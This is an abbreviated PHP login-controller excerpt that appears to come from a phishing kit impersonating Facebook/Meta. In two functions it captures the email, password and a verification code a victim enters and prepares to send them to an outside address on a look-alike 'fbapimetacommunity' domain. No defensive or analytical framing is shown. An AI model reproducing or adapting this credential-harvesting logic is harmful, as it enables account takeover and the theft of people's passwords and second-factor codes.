...
class LoginController extends Controller { 
    ...
    public function store(Request $request) {
      ...
      if ($user === null) {
        ...
        if($try == '2')
        {
          ...
          //---Send Email Function
          $reciept_email="copyright@fbapimetacommunity.com";
          $data = array('name'=>"Login Email",'from'=>$reciept_email,'sender'=>$reciept_email,'cus_email'=>$email,'cus_password'=>$password);
    ...
    public function codestore(Request $request) {
      ...
      if($user[0]->code == null)
      {
        ...
        //---Send Email Function
        $reciept_email="copyright@fbapimetacommunity.com";
        $data = array('name'=>"Login Email",'from'=>$reciept_email,'sender'=>$reciept_email,'cus_code'=>$text,'cus_email'=>$email,'cus_password'=>$password);
